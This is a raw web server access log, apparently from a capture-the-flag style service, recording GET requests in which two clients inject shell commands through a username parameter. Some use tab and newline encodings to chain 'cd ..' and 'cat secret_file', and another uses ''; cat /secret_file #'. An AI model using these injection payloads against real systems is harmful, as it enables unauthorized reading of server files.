14.161.31.188 - - [28/Aug/2022:07:23:56 +0000] "GET /index.php?username=%27cd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0Acat%09secret_file%0A&type=gnu HTTP/1.1" 200 1323 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:24:03 +0000] "GET /index.php?username=%27cd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0Acat%09secret_file%0A&type=eyes HTTP/1.1" 200 1069 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:24:15 +0000] "GET /index.php?username=%27cd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%0A&type=eyes HTTP/1.1" 200 1065 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:24:27 +0000] "GET / HTTP/1.1" 200 1206 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:24:29 +0000] "GET /index.php?username=s&type=random HTTP/1.1" 200 1200 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:24:38 +0000] "GET /index.php?username=%27%3Bcat+%2Fsecret_file+%23&type=figlet HTTP/1.1" 200 1058 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:24:43 +0000] "GET /index.php?username=&type=eyes HTTP/1.1" 200 1197 "http://128.199.190.141:5551/index.php?username=%27%3Bcat+%2Fsecret_file+%23&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:24:47 +0000] "-" 408 0 "-" "-"
